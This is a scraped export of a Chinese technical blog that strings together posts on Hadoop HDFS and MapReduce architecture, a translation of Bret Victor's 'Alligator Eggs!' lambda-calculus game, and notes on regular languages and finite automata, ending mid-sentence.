HDFS、MapReduce 和其他项目公共内容，从 0.21 开始 HDFS 和 MapReduce 被分离为独立的子项目，其余内容为 Hadoop Common HDFS：Hadoop Distributed File System MapReduce：并行计算框架，0.20 前使用 org.apache.hadoop.mapred 旧接口，0.20 版本开始引入 org.apache.hadoop.mapreduce 的新 API HDFS 结构 HDFS 是一个高度容错性的系统，适合部署在廉价的机器上。 硬件错误是常态而不是异常，错误检测和快速、自动的恢复是HDFS最核心的架构目标。 运行在 HDFS 上的应用需要 流式访问 数据集，HDFS 的设计更多考虑了数据批处理，而不是用户交互处理。比之数据访问的低延迟问题，更关键的在于 数据访问的高吞吐量。 移动计算比移动数据更划算：一个应用请求的计算，离它操作的数据越近就越高效，HDFS 为应用提供了将它们自己移动到数据附近的接口。 HDFS 采用 master/slave 结构，一个 HDFS 集群由一个 Namenode 和一定数目的 Datanodes 组成。Namenode 是一个 中心服务器，负责管理文件系统的命名空间以及客户端对文件的访问；集群中的 Datanode 一般是一个节点一个，负责管理它所在节点上的存储。HDFS 暴露了文件系统的命名空间，用户能够以文件的形式在上面存储数据。从内部看，一个文件其实被分成一个或多个数据块，这些块存储在一组 Datanode 上。Namenode 执行文件系统的命名空间操作，如打开、关闭、重命名文件或目录，它也负责确定数据块到具体 Datanode 节点的映射。Datanode 负责处理文件系统客户端的读写请求，在 Namenode 的统一调度下进行数据块的创建、删除和复制。Namenode 是所有 HDFS 元数据的仲裁者和管理者，用户数据永远不会流过 Namenode。 数据复制和副本 HDFS 将每个文件存储成一系列的数据块，除了最后一个，所有的数据块都是同样大小的。一个典型的数据块大小是 64MB，HDFS 中的文件总是按照 64MB 被切分成不同的块，每个块尽可能地存储于不同的 Datanode 中。为了容错，文件的所有数据块都会有副本，每个文件的数据块大小和副本系数都是可配置的，应用程序可以指定某个文件的副本数目。副本系数可以在文件创建的时候指定，也可以在之后改变。HDFS中的文件都是一次性写入的，并且严格要求在任何时候只能有一个写入者。 Namenode 全权管理数据块的复制，它周期性地从集群中的每个 Datanode 接收心跳信号和块状态报告。接收到心跳信号意味着该 Datanode 节点工作正常，块状态报告包含了一个该 Datanode 上所有数据块的列表。 大型 HDFS 实例一般运行在跨越多个机架的计算机组成的集群上，不同机架上的两台机器之间的通讯需要经过交换机。在大多数情况下，同一个机架内的两台机器间的带宽会比不同机架的两台机器间的带宽大。通过 机架感知（使用 API resolve 将 slave 的 DNS 名称（或IP地址）转换成机架id）Namenode可以确定每个 Datanode 所属的机架 id。一种简单但没有优化的策略是将副本存放在不同的机架上，这样可以有效防止当整个机架失效时数据的丢失，且允许读数据的时候充分利用多个机架的带宽。但这种策略的一个写操作需要传输数据块到多个机架，增加了写的代价。大多数情况下，副本系数是3，HDFS 的存放策略是将 一个副本存放在本地机架的节点上，一个副本放在同一机架的另一个节点上，最后一个副本放在不同机架的节点上。 HDFS 会尽量让读取程序读取离它最近的副本。如果在读取程序的同一个机架上有一个副本，那么就读取该副本。如果一个 HDFS 集群跨越多个数据中心，那么客户端也将首先读本地数据中心的副本。 Namenode 启动后会进入一个称为 安全模式 的特殊状态。处于安全模式的 Namenode 不会进行数据块的复制，并从所有的 Datanode 接收心跳信号和块状态报告。块状态报告包括了某个 Datanode 所有的数据块列表，每个数据块都有一个指定的最小副本数。当 Namenode 确认某个数据块的副本数目达到这个最小值，那么该数据块就会被认为是副本安全的；在一定百分比（这个参数可配置）的数据块被 Namenode 检测确认是安全之后（加上一个额外的30秒等待时间）， Namenode 将退出安全模式状态。接下来它会确定还有哪些数据块的副本没有达到指定数目，并将这些数据块复制到其他 Datanode 上。 元数据持久化 Namenode 上保存着 HDFS 的命名空间，对于任何对文件系统元数据产生修改的操作，Namenode 都会使用 EditLog 事务日志记录下来。Namenode 在本地操作系统的文件系统中存储这个 Editlog。整个文件系统的命名空间，包括数据块到文件的映射、文件的属性等，都存储在一个称为 FsImage 的文件中，这个文件也放在 Namenode 所在的本地文件系统上。 Namenode 在内存中保存着整个文件系统的命名空间和文件数据块映射的映像。这个关键的元数据结构设计得很紧凑，因此 4G 内存的 Namenode 足够支撑大量的文件和目录。当 Namenode 启动时，它从硬盘中读取 Editlog 和 FsImage，将所有 Editlog 中的事务作用在内存中的 FsImage 上，并将这个新版本的 FsImage 从内存中保存到本地磁盘上，然后删除旧的 Editlog，这个过程称为一个检查点。 Datanode 将 HDFS 数据以文件的形式存储在本地的文件系统中，它并不知道有关 HDFS 文件的信息。它把每个HDFS数据块存储在本地文件系统的一个单独的文件中。Datanode 并不在同一个目录创建所有的文件，而是用试探的方法来确定每个目录的最佳文件数目，并且在适当的时候创建子目录。在同一个目录中创建所有的本地文件并不是最优的选择，这是因为本地文件系统可能无法高效地在单个目录中支持大量的文件。当 Datanode 启动时，它会扫描本地文件系统，产生一个这些本地文件对应的所有 HDFS 数据块的列表，然后作为报告发送到 Namenode ，这个报告就是块状态报告。 集群通讯和健壮性 客户端通过一个可配置的 TCP 端口连接到 Namenode，通过 ClientProtocol 协议与 Namenode 交互。而 Datanode 使用 DatanodeProtocol 协议与 Namenode 交互。一个远程过程调用模型被抽象出来封装 ClientProtocol 和 Datanodeprotocol 协议。Namenode 不会主动发起 RPC，而是响应来自客户端或 Datanode 的 RPC 请求。 三种出错情况是：Namenode 出错、Datanode 出错、网络割裂。Datanode 出错和网络割裂可能导致一部分 Datanode 跟 Namenode 失去联系。Namenode 通过心跳信号的缺失来将近期不再发送心跳信号 Datanode 标记为宕机，不会再将新的 IO 请求发给它们，且任何存储在宕机 Datanode 上的数据将不再有效。这可能会引起一些数据块的副本系数低于指定值，Namenode 不断地检测这些需要复制的数据块，一旦发现就启动复制操作。 HDFS 支持数据均衡策略。如果某个 Datanode 节点上剩余空闲空间低于临界点，系统会自动地将数据从这个 Datanode 移动到其他空闲 Datanode。当对某个文件的请求突然增加，也可能启动一个计划创建该文件新的副本，并且同时重新平衡集群中的其他数据。 当 HDFS 客户端创建一个新的 HDFS 文件时，会计算这个文件每个数据块的校验和，并将校验和作为一个单独的隐藏文件保存在同一个 HDFS 名字空间下。当客户端获取文件内容后，它会检验从 Datanode 获取的数据跟相应的校验和文件中的校验和是否匹配，如果不匹配，客户端可以选择从其他 Datanode 获取该数据块的副本。 FsImage 和 Editlog 是 HDFS 的核心数据结构。如果这些文件损坏了，整个 HDFS 实例都将失效，因此 Namenode 可以配置成支持维护多个 FsImage 和 Editlog 的副本。Namenode 是 HDFS 集群中的 单点故障 所在。如果 Namenode 机器故障，需要手工干预。也可以通过指定配置，在 Namenode 宕机时切换到 Secondary Namenode。 数据组织 客户端缓存：客户端创建文件的请求并没有立即发送给 Namenode。HDFS 客户端会先将文件数据缓存到本地的一个临时文件，应用程序的写操作被透明地重定向到这个临时文件。当这个临时文件累积的数据量超过一个数据块的大小，客户端才会联系 Namenode。Namenode 将文件名插入文件系统的层次结构中，并且分配一个数据块给它，然后返回 Datanode 的标识符和目标数据块给客户端。接着客户端将这块数据从本地临时文件上传到指定的 Datanode 上。当文件关闭时，在临时文件中剩余的没有上传的数据也会传输到指定的 Datanode 上，然后客户端告诉 Namenode 文件已关闭，此时 Namenode 才将文件创建操作提交到日志里进行存储。如果 Namenode 在文件关闭前宕机，该文件将丢失。 流水线复制：假设文件的副本系数设置为3，且客户端开始向第一个 Datanode 传输数据，第一个 Datanode 逐小块(4 KB)地接收数据，将每一部分写入本地仓库，并同时传输该部分到列表中第二个 Datanode 节点。第二个 Datanode 也以此类推同时传给第三个 Datanode。即，Datanode 流水线式地从前一个节点接收数据，并在同时转发给下一个节点。 HDFS 使用存储空间回收 当用户或应用程序删除某个文件时，HDFS 会将这个文件重命名转移到 .Trash 目录。文件在 .Trash 中保存的时间是可配置的（设置属性 fs.trash.interval），超时后 Namenode 会将该文件从命名空间中删除，删除文件会使得该文件相关的数据块被释放，因此从用户删除文件到 HDFS 空闲空间的增加之间会有一定时间的延迟。 当一个文件的副本系数被减小后，Namenode 会选择过剩的副本删除，并在下次心跳检测时将该信息传递给 Datanode。 Secondary NameNode 因为 NameNode 只有在启动阶段才合并 fsImage 和 EditLog，所以日志文件可能会变得非常庞大，且下一次 NameNode 启动会花很长时间。 Secondary NameNode 定期合并 fsImage 和 EditLog，将日志文件大小控制在一个限度下。因为内存需求和 NameNode 在一个数量级上，所以通常 Secondary NameNode 和 NameNode 运行在不同的机器上。Secondary NameNode 通过 bin/start-dfs.sh 在`conf/masters 中指定的节点上启动。 Secondary NameNode 的检查点进程启动，由两个配置参数控制： fs.checkpoint.period：指定连续两次检查点的最大时间间隔，默认为 1 小时； fs.checkpoint.size：定义日志文件的最大值，一旦超过这个值会强制执行检查点，默认值是64MB。 Secondary NameNode 保存最新检查点的目录与 NameNode 的目录结构相同，NameNode 可以在需要的时候读取 Secondary NameNode 上的检查点镜像。如果 NameNode 上除了最新的检查点以外，所有的其他的历史镜像和日志文件都丢失了，则可以引入这个最新的检查点： 在配置参数 dfs.name.dir 指定的位置创建空目录； 把检查点目录的位置赋值给配置参数 fs.checkpoint.dir； 启动 NameNode，并加上 -importCheckpoint。 按上述步骤，NameNode 会从 fs.checkpoint.dir 目录读取检查点，并把它保存在 dfs.name.dir 目录下。如果 dfs.name.dir 目录下有合法的镜像文件，NameNode 会启动失败。NameNode 会检查 fs.checkpoint.dir 目录下镜像文件的一致性，但是不会改动它。 Map/Reduce 一个 Map/Reduce 作业通常会把输入的数据集切分为若干独立的数据块，由 map 任务以完全并行的方式处理它们。框架会对 map 的输出先进行排序，然后把结果输入给 reduce 任务。通常作业的输入和输出都会被存储在文件系统中。整个框架负责任务的调度和监控，以及重新执行已经失败的任务。 通常，Map/Reduce 框架和分布式文件系统是运行在一组相同的节点上的，即计算节点和存储节点通常在一起。Map/Reduce 框架由一个单独的 master JobTracker 和每个集群节点一个 slave TaskTracker 组成。master 负责调度构成一个作业的所有任务，这些任务分布在不同的 slave 上，master 监控它们的执行，重新执行已经失败的任务，slave 仅负责执行由 master 指派的任务。 应用程序通过提供 map 和 reduce 来实现 Mapper 和 Reducer 接口，它们组成作业的核心。Mapper 将输入键值对映射到一组中间格式的键值对集合，这种转换的中间格式记录集不需要与输入记录集的类型一致，一个给定的输入键值对可以映射成 0 个或多个输出键值对；Reducer 将与一个 key 关联的一组中间数值集归约为一个更小的数值集。Map 的数目通常是由输入数据的大小决定的，一般就是所有输入文件的总块数。 Reducer有3个主要阶段：shuffle、sort 和 reduce。 Shuffle：Reducer 的输入就是 Mapper 已经排好序的输出。在这个阶段，框架通过 HTTP 为每个 Reducer 获得所有 Mapper 输出中与之相关的分块。 Sort：框架按照 key 的值对 Reducer 的输入进行分组（不同 mapper 的输出中可能会有相同的key）。Shuffle 和 Sort 两个阶段是同时进行的，map 的输出也是一边被取回一边被合并的。 Reduce：框架为已分组的输入数据中的每个 &lt;key, (list of values)&gt; 对调用一次 reduce(WritableComparable, Iterator, OutputCollector, Reporter) 方法。Reduce任务的输出通常是通过调用 OutputCollector.collect(WritableComparable, Writable) 写入文件系统的。Reducer的输出是没有排序的。Reduce的数目建议是 0.95 或 1.75 乘以 (&lt;no. of nodes&gt; * mapred.tasktracker.reduce.tasks.maximum)。增加 Reduce 的数目会增加整个框架的开销，但可以改善负载均衡，降低由于执行失败带来的负面影响。 参考资料：Hadoop 0.18 中文文档 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/08/22/hadoop_knowledge/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Hadoop","slug":"Hadoop","permalink":"http://forec.github.io/tags/Hadoop/"},{"name":"分布式系统","slug":"分布式系统","permalink":"http://forec.github.io/tags/分布式系统/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"从鳄鱼蛋看 λ 演算","slug":"AlligatorEggs","date":"2017-03-21T15:42:42.000Z","updated":"2017-03-22T05:49:54.000Z","comments":true,"path":"2017/03/21/AlligatorEggs/","link":"","permalink":"http://forec.github.io/2017/03/21/AlligatorEggs/","excerpt":"这篇文章是 Bret Victor 所著 《Alligator Eggs!》 的中文译文，已联系原作者取得授权。Bret Victor 在 2007 到 2011 年期间在苹果负责人机界面开发，参与设计了最初的 iPad，他的个人网站非常精美，文章也及其友好。更多关于他的信息可以参考维基百科上 Bret Victor 的词条。","text":"这篇文章是 Bret Victor 所著 《Alligator Eggs!》 的中文译文，已联系原作者取得授权。Bret Victor 在 2007 到 2011 年期间在苹果负责人机界面开发，参与设计了最初的 iPad，他的个人网站非常精美，文章也及其友好。更多关于他的信息可以参考维基百科上 Bret Victor 的词条。 This Article is the Chinese translation for Alligator Eggs! (Written by Bret Victor). 准备材料 第一步：将这个 PDF 文件 打印到六种不同颜色的纸板上。 第二步：将这个 PDF 文件 打印到几张白纸上。 第三步：把这些鳄鱼和鳄鱼蛋剪下来！ 零件下面这些是 饥饿的鳄鱼（彩色的）：饥饿的鳄鱼 需要进食。它们会吃掉任何在它们面前的东西！但是它们同时也是 负责任的 鳄鱼，所以它们还需要守护自己的家庭。 这些是 老鳄鱼：老鳄鱼们并不需要进食，它们已经吃饱了，而它们生活的唯一目标就是保卫自己的家庭。 这些是 蛋：蛋会孵化出新的鳄鱼家庭！ 家庭这是一个小家庭：一条绿色的鳄鱼守护着她绿色的蛋。 这是一个稍大的家庭：一条绿鳄鱼和一条红鳄鱼在一起保护着一个绿色的鳄鱼蛋和一个红色的鳄鱼蛋。或者，你也可以这么理解：一条绿色的鳄鱼正在保护着一条红色的鳄鱼，而这条红色的鳄鱼正在看护着这些蛋。 这是一个大家庭！我们可以看到，各有一条黄色、绿色和红色的鳄鱼在守卫着这个家庭。它们守护着三个东西：一个绿色的鳄鱼蛋，一条老鳄鱼，以及一个红色的鳄鱼蛋。这条老鳄鱼还保护着一个黄色的鳄鱼蛋和一个绿色的鳄鱼蛋。注意！鳄鱼蛋必须和它们保护者的颜色一致。换句话说，如果有一个蓝色的鳄鱼蛋，那就必须有一条蓝色的鳄鱼守护着它。 进食现在事情开始变得复杂起来了。这是紧挨着的两个家庭： 毫无疑问，绿色的鳄鱼正处于饥饿状态。无独有偶，有一个黄色的鳄鱼家庭就在她面前。看起来似乎很好吃！ 我想你已经知道马上会发生什么事。 不幸的是，绿色的鳄鱼有些高估自己的能力了。她吃得太多了！ 这条绿色的鳄鱼去了鳄鱼天堂。但是，故事仍在继续。绿色鳄鱼死了之后，她所看护的绿色鳄鱼蛋开始孵化…… 太神奇了，这个绿色鳄鱼蛋竟然孵化成了绿色鳄鱼刚刚吃掉的东西。这是生命的奇迹！ 现在，它们又变成了一个家庭。这个家庭中有一条红鳄鱼守卫着一条黄鳄鱼和一个红鳄鱼蛋，而这条黄鳄鱼则守护着她的黄色鳄鱼蛋。 这条黄色鳄鱼当然也需要进食，何况她的面前恰好有一个美味的红色鳄鱼蛋。让我们再重复一次…… 可怜的鳄鱼。对她的食量来说，即便是一个鳄鱼蛋也难以消化！ 这条黄色的鳄鱼死了…… 但是同时，黄色的鳄鱼蛋也开始孵化…… 黄色的鳄鱼蛋孵化出了黄色鳄鱼吃掉的东西。 现在已经没有任何鳄鱼有机会进食了，所以这个故事到这里可以停止了。 进食规则上面所述的故事是这个游戏的第一条规则：进食规则。 进食规则指的是，如果有一些紧挨着的家庭…… 那么最左上角的鳄鱼会吃掉她右侧的整个鳄鱼家庭。 之后，进食的这条鳄鱼会死掉。但如果这条鳄鱼正在守卫着任何和她颜色相同的鳄鱼蛋，那么 每个 这样的鳄鱼蛋（与死去的鳄鱼颜色相同且被其守卫的）都会孵化出这条死去的鳄鱼刚刚吃过的东西。 颜色规则继续上面的例子，橘黄色的鳄鱼吃掉了黄色的鳄鱼家庭，情况变成下面这样： 现在，左上角的绿色鳄鱼想要吃掉她右侧的鳄鱼家庭。但是在此之前，我们得检查一下这是否符合 颜色规则。 颜色规则说的是，如果一条鳄鱼准备吃掉一个鳄鱼家庭，并且有一种颜色在 两个家庭（进食的鳄鱼所属的家庭和将要被吃掉的家庭） 中都出现了，我们就需要将其中一个家庭的这种颜色替换为其它颜色。 上面的图片中，绿色和红色同时出现在第一、第二个家庭中。因此，我们将第二个家庭中所有的绿色替换为浅蓝色，所有的红色替换为黄色。 现在各个家庭间没有相同的颜色了，鳄鱼们已经饥渴难耐！动嘴吧！ 还可以吃！ 继续！ 直到没有东西可以被吃掉。 老鳄鱼这个游戏还有一条与 老鳄鱼 有关的额外规则： 左上角的老鳄鱼并不会感到饥饿，她不需要吃任何东西，她的生命只会奉献给她的家庭。那么这个游戏该怎么继续下去呢？ 当需要守护的东西只剩最后一样的时候，老鳄鱼会撒手鳄寰。现在，左上角的老鳄鱼同时看护着一个绿色的家庭和一个红色的家庭，这些家庭还需要她去照顾。但是现在，绿色的鳄鱼需要进食了，于是它吃掉了右侧的红色家庭…… 现在，老鳄鱼只看护着一个家庭。这个家庭可以照顾自己了，老鳄鱼失去了存在的意义，所以她很快离去。 这就是 老龄规则。当一条老鳄鱼只看管着（直接看管）一样东西时，她就该离开这个世界了。 最后，红色的鳄鱼吃掉了黄色的家庭。 游戏游戏包含一系列谜题，目标是让玩家设计一个家庭，使这个家庭在进食 X 后能够产出 Y。举个例子： 这是两个家庭，我们将左侧的家庭命名为 “True”，将右侧的家庭命名为 “False”： 这是一个名为 “Not” 的家庭： 当 “Not” 吃掉 “True” 的时候会产生 “False”，同样的，当 “Not” 吃掉 “False” 的时候会产生 “True”。那么，“Not” 中最底部的两个鳄鱼蛋应该是什么颜色呢？ （我们需要完善一下颜色规则：如果两个家庭颜色不同，但具有相同的模式，即相同位置的鳄鱼/蛋在两个家庭中的颜色能够建立起一一映射，就认为这两个家庭是等价的。） 这些谜题可以嵌入一些故事中。玩家必须依次解决谜题才能看到故事的发展。或者，这些谜题可以做成棋盘游戏。每个玩家通过选择鳄鱼死亡来解决到达目的地等问题。 理论这个游戏实际表示了 无类型的 λ 演算 。饥饿的鳄鱼 是 λ 表示的抽象函数，老鳄鱼 是括号，鳄鱼蛋 是变量。进食规则 对应着 β-规约，颜色规则 对应着 α-变换。老龄规则 指的是，如果一对括号仅仅包含着单个不可分割表达式，那这对括号就可以被去除。 变换奥利弗·斯蒂尔（Oliver Steele）指出，家庭角色对孩子的影响非常重要，这个游戏中的物品可以进一步变化为祖父母鳄鱼、鳄鱼家长和婴儿（蛋）等等。目前，变量名称是通过颜色表示的。这两者都是任意的，所以需要重命名/染色的规则去避免冲突。可以采用类似布鲁恩指数的替代方案，从而能够反应出生顺序和家庭关系。 奥利弗还建议，孩子们也许不会喜欢家长去世这一说法，所以鳄鱼的死亡可以解释为离开。 通过改变游戏规则，让饥饿的鳄鱼变得 贪婪，并吃掉一切在它们右侧的东西，我们就可以表示 右结合 的 λ 演算。和丘奇数、Y 组合子等相比，这种表示方法似乎去掉了许多老鳄鱼（括号）。不幸的是，这意味着当鳄鱼吃掉不止一样东西时，必须有老鳄鱼出生，同时也会产生一些其他问题。我仍然想找到一种让丘奇数（重复施用）看起来不那么丑陋的表示方法。 示意图我发现 “鳄鱼演算” 的原理比手动计算 λ 表达式来的更容易。我们将 λ 画做一条带嘴的直线。括号是一条不带嘴的直线。这是恒等（identity）函数： 这是一些丘奇数： 这是布尔型操作 AND 和 OR： Y 组合子： 我不知道它们 读 起来是不是比标准符号更容易些，但我发现在有纸笔的情况下它们确实更容易 处理 。想象一下，一个表达式吃掉另一个并将它在底部孵化。我不会再在一长串符号中迷失，忘掉该把哪个 λ 应用到哪个 λ 上。 英文原文链接： Alligator Eggs! (Written by Bret Victor) 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/03/21/AlligatorEggs/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"函数式编程","slug":"函数式编程","permalink":"http://forec.github.io/tags/函数式编程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"右线性语言","slug":"formal-languages-and-automata3","date":"2017-03-19T15:09:53.000Z","updated":"2017-03-21T15:16:12.000Z","comments":true,"path":"2017/03/19/formal-languages-and-automata3/","link":"","permalink":"http://forec.github.io/2017/03/19/formal-languages-and-automata3/","excerpt":"正则集、正则式，右线性文法，正则表达式与有限自动机之间的图示关系，右线性语言与有限自动机之间的关系。","text":"正则集、正则式，右线性文法，正则表达式与有限自动机之间的图示关系，右线性语言与有限自动机之间的关系。 正则集和正则式 正则集可用正则式表示。字母表 T 上的一个正则式和它表示的正则集可递归定义如下： ε 和 ∅ 都是正则式，分别表示的正则集是 {ε} 和空集 ∅； 任意 a ∈ T 是正则式，他表示的正则集是 {a}（以上两条为原子正则式）； 如果 A 和 B 是正则式，分别表示的正则集是 L(A) 和 L(B)，则 (A+B)、(A·B)、(A) 也都是正则式，分别表示的正则集是 L(A) ∪ L(B)、L(A)L(B)、`L(A)。操作的优先级为*（闭包） &gt; ·（连接）&gt; +（联合）`。 仅由 有限次 使用以上三步定义的表达式才是字母表 T 的正则式。如果两个正则式表示相同的正则集，则称两个正则式相等。 假设 α、β、γ 都是正则式，则： (α + β) + γ = α + (β + γ) (α · β) · γ = α · (β · γ) α + β = β + α α + α = α α · (β + γ) = (α · β) + (α · γ) (β + γ) · α = (β · α) + (γ · α) α + ∅= α（零元） α · ∅ = ∅ · α = ∅（零元） α · ε = ε · a = a（幺元） (α*)* = α*（闭包） α* = ε + α+ ∅* = ε 注意： 正则集是 T* 的子集； L+ 包含 ε 当且仅当 L 包含 ε； 每个正则集至少对应一个正则式。 右线性文法与正则右线性文法与正则式 右线性文法（正则文法）与正则式具有等价性。 求解规则：设 x = αx + β, α ∈ T*, β ∈ (N∪T)*, x ∈ N，可解出 x = α*β。 例：G = {N = {S, A, B}, T = {a, b}, P, S}，其中 P 包括以下规则：S → aA, S → bB, S → b, A → bA, A → ε, B → bS。 将 P 中的推导式联立，可得到 S = aA + bB + b，A =bA + ε 和 B = bS； 根据 A = bA + ε，应用求解规则得到 A = b*； 将 A = b*，B = bS 代入，得到 S = ab* + bbS + b，转换形式得到 S = (bb)S + (ab* + b)； 在此应用求解规则得到 S = (bb)*(ab*+b)。 右线性文法与正则集 正则集是由右线性文法产生的语言，二者是等同的 ，按照上面定义的正则集都是右线性文法产生的语言。 设字母表为 T。∅、{ε} 和 {a}（任意 a ∈ T）都是正则集，则 ∅、{ε} 和 {a} 都是右线性语言。它们分别对应的右线性文法是 G∅ = ({S}, T, ∅, S)、G{ε} = ({S}, T, {S → ε}, S) 以及 G{a} = ({S}, {a}, {S → a}, S)。 可证明，设字母表 T 上有右线性语言 L1 和 L2，则 L1∪L2、L1L2 和 L1* 都是右线性语言。 证 L1 ∪ L2 为右线性语言：有右线性文法 G = (N, T, P, S)，其中 N = N1 ∪ N2 ∪ {S}，P = P1 ∪ P2 ∪ {S → S1, S → S2}，S ∉ N1 ∪ N2，是一个新的非终结符； 证 L1L2 为右线性语言：有右线性文法 G = (N, T, P, S)，其中 N = N1 ∪ N2，S = S1，生成式 P 为：若 A → αB ∈ P1 则 A → αB ∈ P，若 A → α ∈ P1，则 A → αS2 ∈ P，P2 ⊆ P。 证 L1* 是右线性语言：有右线性文法 G = (N, T, P, S)，其中 N = N1 ∪ {S}，S ∉ N1，S 是一个新非终结符，生成式 P 定义为：若 A → αB ∈ P1 则 A → αB ∈ P，若 A → α ∈ P1 则 A → αS ∈ P 且 A → α ∈ P，且 P 中包括 {S → S1, S → ε}。 正则表达式和有限自动机 以下图片均来自王柏教授（北京邮电大学大数据科学与服务中心）的《形式语言与自动机》课件。 有限自动机、右（左）线性文法和正则表达式都定义了同一种语言（正则语言）。 由 DFA 构造等价的正则表达式（状态消去法）: 从 DFA 构造等价正则表达式的具体步骤如下： 对每一终态 q，依次消去除 q 和初态 q0 之外的其它状态； 若 q ≠ q0，最终可得到一般形式：(R+ SU*T)*SU*，如下图中左侧的自动机； 若 q = q0，最终可得到如图中右侧的自动机，对应正则式为 R*； 最终的正则表达式为 每一终态对应的正则表达式之和（联合） 。 从正则表达式构建等价的 ε-NFA，可根据如下几种基本组合子组合： 对于 R+S、RS 以及 R*，分别为下图中从上到下三种连接方式： 右线性文法与有限自动机右线性文法 ⇒ 有限自动机 设右线性文法 G = (N, T, P, S)，产生语言为 L(G)，则存在一个有限自动机 M 接受语言 L(M) = L(G)。 构造：构造一个与 G 等价的 NFA M = (Q, T, δ, q0, F)，其中 Q = N ∪ {H}，H 为新增状态，H ∉ N； q0 = S； 当 S → ε ∈ P 时，F = {H, S}，否则 F = {H}； δ 的定义为：若 A → αB ∈ P 则 B ∈ δ(A, α)，若 A → α ∈ P 则 H ∈ δ(A, α)，且对任意输入有 δ(H, α) = ∅。 例：G = ({S, B}, {α, β}, P, S)，其中 P 为 S → αB, B → αB | βS | α。 令 NFA M = (Q, T, δ, q0, F)，Q = {S, B, H}，T = {α, β}，q0 = S，F = {H}； ∵ S → αB，故 δ(S, α) 中包括 B； ∵ B → αB，故 δ(B, α) 中包括 B； ∵ B → βS，故 δ(B, β) 中包括 S； ∵ B → α，故 δ(B, α) 中包括 H。 有限自动机 ⇒ 右线性文法 设 DFA M 接受的语言为 L(M)，则存在右线性文法 G，它产生的语言 L(G) = L(M)。 构造：设 M = (Q, T, δ, q0, F)，则令 G = (N, T, P, S)，其中 N = Q，S = q0； 若 δ(A, α) = B 且 B ∉ F 则 A → αB ∈ P； 若 δ(A, α) = B 且 B ∈ F 则 A → α ∈ P，A → αB ∈ P。 对于 NFA，可以转换为等价的 DFA 再做相应构造。 右线性语言性质TODO 专栏目录：计算机理论基础此专栏的上一篇文章：有限自动机此专栏的下一篇文章：暂无 参考资料：《形式语言与自动机》，王柏、杨娟编著，北京邮电大学出版社 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/03/19/formal-languages-and-automata3/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"自动机","slug":"自动机","permalink":"http://forec.github.io/tags/自动机/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"有限自动机","slug":"formal-languages-and-automata2","date":"2017-03-18T13:41:32.000Z","updated":"2017-03-19T15:24:22.000Z","comments":true,"path":"2017/03/18/formal-languages-and-automata2/","link":"","permalink":"http://forec.github.io/2017/03/18/formal-languages-and-automata2/","excerpt":"确定的/非确定的有限自动机，带/不带 ε 转移的非确定有限自动机以及各自之间的等价性。","text":"确定的/非确定的有限自动机，带/不带 ε 转移的非确定有限自动机以及各自之间的等价性。 有限自动机（Finite State Automation） ：状态 是将事物区分开的一种标识，状态 + 输入 → 状态转移。 具有 离散 输入（输出，不必须）系统的一种数学模型，特殊情况下也可无输入； 有限的状态； 根据每次转换的后继状态数量可区分为 确定的 有限自动机（DFA，后继状态唯一）和 不确定的 有限自动机（NFA，后继状态有多个）。 确定的有限自动机 形式定义：DFA 是一个五元组，M = (Q, T, δ, q0, F)： Q：有限的状态集合 T：有限的输入字母表 δ：转换函数，映射 Q × T → Q q0：初始状态，q0 ∈ Q F：终止状态集，F ⊆ Q 输入一个字符串时，对转换函数 δ 扩展：δ&#39; = Q × T* → Q，对任何 q ∈ Q，定义： q&#39;(q, ε) = q ：没有读到字符时，有限自动机状态不变 对 a ∈ T 和 ω ∈ T*，有 δ&#39;(q, ωa) = δ(δ&#39;(q, ω), a) 被 DFA 接收的字符串 ω 满足：δ(q0, ω) = p, p ∈ F，即 输入结束后能够使 DFA 状态到达终态 。 格局 ：FSA 在某个时刻的工作状态可以用 (q, ω) 表明，其中 ω 为待输入字符串，q 为当前状态。 初始格局：(q0, ω) 终止格局：(q, ε), q ∈ F 当 δ(q, a) 含有 q1，则用格局形式写为 (q, aω) |--- (q1, ω)，其中 ω ∈ T*，符号 |--- 表示从一个格局变换为另一个格局。 不确定的有限自动机 形式定义：NFA 是一个五元组，M = (Q, T, δ, q0, F)，与 DFA 仅 δ 不同，NFA 的 δ 的映射范围为 Q × T → 2^Q，即 NFA 在某个状态下读入一个字符时，可转换的后继状态是 Q 的一个子集。 输入字符串时对 δ 扩展： 对 ε ∈ T*，有 `δ’(q, ε) = {q}’； 对任意 a ∈ T, ω ∈ T*，有 `δ’(q, ωa) = {p | 对 δ’(q, ω) 中的某个状态 r，且 p 在 δ(r, a) 内}； δ(P, ω) = ∪ δ(q, ω), q ∈ P, P ⊆ Q。 NFA 接受的语言为 `L(M) = {ω | δ(q0, ω) 含 F 中的一个状态}。 DFA 和 NFA 的等价性 DFA 是 NFA 的特例，NFA 必然能够接受 DFA 能接受的语言。 从 NFA 构造等价的 DFA（子集构造法）： 设 L 为某个 NFA，N = (QN, T, δN, q0, FN)，定义等价的 DFA 为 M = (QD, T, δD, {q0}, FD)； 定义的 DFA 中，QD = {S | S ⊆ QN} = 2^Q，对 S ∈ QD 和 a ∈ T，有 δD(S, a) = ∪ δN(q, a), q ∈ S； FD = {S | S ⊆ QN ∩ S ∩ FN ≠ ∅} （只要有一个在 F 中就可视为终止状态）； 构造过程从 q0 开始，仅当某些状态已加入可达状态时，才加入 DFA 中。最坏情况下由 NFA 构造的 DFA 状态数目为 2^|QN|。 带 ε 转移的不确定的有限自动机 有 ε 转换的 NFA 与无 ε 转换的 NFA 区别仅在于转换函数 δ 的不同，有 ε 转移的 NFA 在输入空串 ε（无输入）时也会引起状态转移，即 δ 是从 Q × (T ∪ 